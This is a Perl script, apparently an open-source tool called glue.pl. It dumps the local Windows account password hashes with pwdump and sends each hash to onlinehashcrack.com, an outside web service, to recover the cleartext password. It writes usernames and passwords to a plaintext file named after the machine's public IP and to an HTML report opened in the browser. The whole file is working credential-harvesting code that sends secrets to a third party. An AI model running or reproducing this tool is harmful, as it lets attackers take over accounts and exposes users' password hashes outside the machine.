#!/usr/bin/env perl

use strict;
use warnings;

use LWP::UserAgent;

sub arch {
	my $a = "32";

	if ((lc $ENV{'PROCESSOR_ARCHITECTURE'} eq "amd64") or (lc $ENV{'PROCESSOR_ARCHITEW6432'} eq "amd64")) {
		$a = "64";
	}

	return $a;
}

sub os {
	my $o = $^O;

	if ($o eq "MSWin32" or $o eq "cygwin") {
		$o = "windows";
	}
	elsif ($o eq "linux") {
		$o = "linux";
	}
	elsif ($o eq "darwin") {
		$o = "mac";
	}
	else {
		$o = "unix";
	}

	return $o;
}

sub curl {
	my ($url, $method, $headers) = @_;

	my $ua = LWP::UserAgent->new;

	my $req = "";

	if ($method eq "post") {
		$req = HTTP::Request->new(POST => $url);

		$req->content_type("application/x-www-form-urlencoded");
		$req->content($headers);
	}
	else {
		$req = HTTP::Request->new(GET => $url);
	}

	my $res = $ua->request($req);

	if ($res->is_success) {
		return $res->content;
	}
	else {
		return "error";
	}
}

sub default_web_browser {
	my $browser = "open"; # mac

	my $o = os;
	if ($o eq "linux") {
		$browser = "x-www-browser";
	}
	elsif ($o eq "windows") {
		$browser = "start";
	}

	return $browser;
}

sub canhazip {
	my $ip = curl("http://icanhazip.com", "get", "");
	$ip =~ s/\n//;

	return $ip;
}

sub dump_accounts {
	my $a = arch;
	my $flag64 = "";
	$flag64 = "-x" unless $a eq "32";

	my $command = "pwdump $flag64 127.0.0.1 2>&1";
	my $output = qx($command);
	
	my $accounts = {};
	
	while ($output =~ m/(.*):[0-9]+:.*:([a-zA-Z0-9]+):::/g) {
		my ($username, $hash) = ($1, $2);
		$accounts->{$username} = $hash;
	}

	return $accounts;
}

sub rainbow {
	my $hash = shift;

	my $password = "";

	my $delay = 2; # sec
	sleep $delay; # prevent DoS

	my $output = curl("http://www.onlinehashcrack.com/free-hash-reverse.php", "post", "hashToSearch=$hash&searchHash=Search");

	if ($output =~ m/letter\-spacing:1\.2px">(.*)<\/b><br \/>/) {
		$password = $1;
	}

	return $password;
}

sub record {
	my ($ip, $decrypted_accounts, $webpage) = @_;

	$ip =~ s/\./\-/g;

	my $record_filename = "$ip.txt";

	open(RECORD, ">$record_filename");

	while (my ($username, $password) = each(%$decrypted_accounts)) {
		print RECORD "Username: $username\n";
		print RECORD "Password: $password\n\n";
	}

	close(RECORD);

	my $begin_content = <<END;
<html>
<head>
<title>Report</title>
<link rel="stylesheet" href="stylesheet.css" type="text/css" />
</head>
<body>
<center>
<h1>Accounts on this computer</h1>
<h4><a href="https://github.com/mcandre/glue">glue.pl</a></h4>
END

	my $end_content = <<END;
</center>
</body>
</html>
END

	open(WEBPAGE, ">$webpage");

	print WEBPAGE $begin_content;

	while (my ($username, $password) = each(%$decrypted_accounts)) {
		my $account = "<h3>$username / <span class=\"password\">$password</span></h3>";
		$account = "<h3>$username</h3>" if $password eq "";

		print WEBPAGE $account;
	}

	print WEBPAGE $end_content;

	close(WEBPAGE);
}

sub show {
	my ($ip, $decrypted_accounts, $webpage) = @_;

	my $browser = default_web_browser;
	my $command = "$browser $webpage";
	system $command;
}

my $ip = canhazip;

print "IP Address: $ip\n";

my $encrypted_accounts = dump_accounts;
my $decrypted_accounts = {};

print "\nAccounts on this computer\n";

while (my ($username, $hash) = each(%$encrypted_accounts)) {
	my $password = rainbow $hash;
	$decrypted_accounts->{$username} = $password;

	print "\nUsername: $username\n";
	print "Password: $password\n" unless $password eq "";
}

my $webpage = "report.html";

record($ip, $decrypted_accounts, $webpage);
show($ip, $decrypted_accounts, $webpage);